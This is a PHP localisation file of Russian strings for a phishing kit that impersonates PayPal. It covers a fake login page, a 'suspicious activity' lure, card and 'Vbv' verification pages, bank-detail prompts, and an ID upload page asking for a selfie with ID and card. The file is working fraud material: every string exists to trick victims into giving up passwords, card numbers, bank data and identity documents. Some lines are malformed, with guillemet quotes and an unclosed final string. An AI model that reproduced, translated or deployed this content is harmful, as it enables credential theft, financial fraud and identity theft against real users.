<?php

/* Страница благодарности */
$P1_text1 = 'Поздравления';
$P1_text2 = 'Перенаправление ...';
$P1_text3 = 'SUMMARY';
$P1_text4 = 'ACTIVITY';
$P1_text5 = 'SEND & REQUEST';
$P1_text6 = 'КОШЕЛЬКА';
$P1_text7 = 'МАГАЗИН';
$P1_text8 = 'Выход из системы';
$P1_text9 = 'Главное меню';
$P1_text10 = 'Hello Again!';
$P1_text11 = 'Максимально использовать PayPal';
$P1_text12 = 'Hello';
$P1_text13 = 'Оплатить или отправить деньги';
$P1_text14 = 'Загрузить приложение';
$P1_text15 = 'Безопасная покупка';
$P1_text16 = 'Шаг проверки';
$P1_text17 = 'Подтвердить карту';
$P1_text18 = 'Проверить личность';
$P1_text19 = 'Доступ к учетной записи';
$P1_text20 = 'Баланс PayPal';
$P1_text21 = 'Детали';
$P1_text22 = 'Вам не нужен баланс, чтобы делать покупки или отправлять платежи';
$P1_text23 = 'Вывести средства';
$P1_text24 = 'Вывести средства в местном банке';
$P1_text25 = 'Банковские счета и карты';
$P1_text26 = 'Добавить свою карту - мы помогаем сохранить вашу информацию в безопасности.';
$P1_text27 = 'Добавить банковский счет или карту';
$P1_text28 = 'Полностью восстановлен доступ к вашей учетной записи';
$P1_text29 = 'Спасибо, что Вы предприняли шаги для восстановления доступа к вашей учетной записи. Ваша логичность и усилия повышают безопасность для всего нашего сообщества пользователей. PayPal принимает безопасность вашей учетной записи, деловых и финансовых данных так же серьезно, как и вы, и эти текущие проверки нашей системы способствуют нашему высокому уровню безопасности, ваш счет будет проверен в течение ближайших 24 часов. ';
$P1_text30 = 'Моя учетная запись';
$P1_text31 = 'Вы будете перенаправлены на вашу учетную запись через 5 секунд ...';
$P1_text32 = 'Copyright © 1999-2017 PayPal. Все права защищены';
$P1_text33 = 'Полезная информация';
$P1_text34 = 'Переход к бизнес-учетной записи';
$P1_text35 = 'Посмотрите, сколько вы можете отправить с помощью PayPal';
$P1_text36 = 'Настройки продавца';
$P1_text37 = 'Адрес';
$P1_text38 = 'Город';
$P1_text39 = 'State';
$P1_text40 = 'Zip';
$P1_text41 = 'Страна';
$P1_text42 = 'Подтвердить банковскую информацию:';
$P1_text43 = 'Введите свою (личную банковскую информацию), чтобы подтвердить свою учетную запись';
$P1_text44 = 'Эта информация хранится в секрете';

/* Безопасная активность */
$P2_text1 = 'Подозрительные действия';
$P2_text2 = 'Чтобы защитить вашу учетную запись, мы регулярно ищем ранние признаки потенциально мошеннической деятельности.';
$P2_text3 = 'Мы обеспокоены потенциальной несанкционированной деятельностью';
$P2_text4 = 'После того, как вы подтвердите свою личность, мы проведем вас через шаги, чтобы сделать вашу учетную запись более безопасной.';
$P2_text5 = 'Войти с неизвестного устройства';
$P2_text6 = 'около Манассаса, VA';
$P2_text7 = 'Чтобы быть в безопасности, мы хотим убедиться, что это ваша учетная запись.';
$P2_text8 = 'Контакт';
$P2_text9 = 'Безопасность';
$P2_text10 = 'Copyright © 1999 - 2017 PayPal. Все права защищены.';
$P2_text11 = 'Конфиденциальность';
$P2_text12 = 'Legal';


/* Страница входа */
$P3_text1 = 'Войдите в свою учетную запись PayPal';
$P3_text2 = 'PayPal';
$P3_text3 = 'Вход в свою учетную запись';
$P3_text4 = 'Некоторая информация не верна. Пожалуйста, попробуйте еще раз.';
$P3_text5 = 'Адрес электронной почты';
$P3_text6 = 'Требуется адрес электронной почты.';
$P3_text7 = 'Этот формат электронной почты не выглядит правильно';
$P3_text8 = 'Пароль';
$P3_text9 = 'Пароль требуется';
$P3_text10 = 'Вход';
$P3_text11 = 'Не удается войти в систему?';
$P3_text12 = 'Проверка вашей информации ...';
$P3_text13 = 'Всего секунду ...';


/* Vbv Page */
$P4_text1 = 'Минуточку ...';
$P4_text2 = 'Дорогой';
$P4_text3 = 'Мы защищаем вашу карту от несанкционированного использования в Интернете, вы не боитесь. Мы просто гарантируем, что вы являетесь законным владельцем этой учетной записи. ';
$P4_text4 = 'Пожалуйста, введите правильную информацию:';
$P4_text5 = 'Номер карты';
$P4_text6 = 'Copyright © 1999';
$P4_text7 = 'Все права защищены';


/* Страница карты */
$P5_text1 = 'Перенаправление ...';
$P5_text2 = 'Вам не нужен баланс, чтобы делать покупки или отправлять платежи';
$P5_text3 = 'Вывести средства';
$P5_text4 = 'Вывести средства с помощью местного банка';
$P5_text5 = 'Банковские счета и карты';
$P5_text6 = 'Минутку ...';
$P5_text7 = 'Данные кредитной карты:';
$P5_text8 = 'Имя';
$P5_text9 = 'Фамилия';
$P5_text10 = 'Номер карты';
$P5_text11 = 'Истечение срока действия';
$P5_text12 = 'Вы должны подтвердить свою информацию, чтобы иметь возможность устранить эту проблему и получить доступ к вашей учетной записи';
$P5_text13 = 'Быстрее платить';
$P5_text14 = 'Сократите ваш цикл продаж с недель до минут';
$P5_text15 = 'Захват платежей';
$P5_text16 = 'Быстро принимать платежи через кредитную и дебетовую карту, отслеживать наличные и проверять транзакции в одном аккаунте';
$P5_text17 = 'Пожертвования';
$P5_text18 = 'Будете ли вы ходить от двери к двери или просто на занятом углу, быстро собирать пожертвования с помощью смартфона или планшета и отправлять квитанции в режиме реального времени. ';
$P5_text19 = 'Copyright © 1999-2017 PayPal. Все права защищены';
$P5_text20 = 'Баланс PayPal';
$P5_text21 = 'Детали';

/* Идентификационная страница */
$P6_text1 = 'Проверить личность';
$P6_text2 = 'Подтвердить личность';
$P6_text3 = 'Мы должны получить несколько ключевых документов, прежде чем мы сможем подтвердить вашу учетную запись';
$P6_text4 = 'Пожалуйста, предоставьте копию одного документа из следующих документов:';
$P6_text5 = 'Выберите файл для продолжения.';
$P6_text6 = 'Кредитная карта';
$P6_text7 = 'Или удостоверение личности';
$P6_text8 = 'Или водительские права';
$P6_text9 = 'Ваши документы, удостоверяющие личность, помогут нам подтвердить вашу личность.';
$P6_text10 = «Что мне делать, чтобы подтвердить мою личность?»;
$P6_text11 = «Возьмите себя, используя свою удостоверение личности и свою карту»;
$P6_text12 = 'Имя и идентификатор карты должны совпадать и быть четко видимыми';
$P6_text13 = 'Ваш документ, удостоверяющий личность, должен быть рядом с вашим лицом;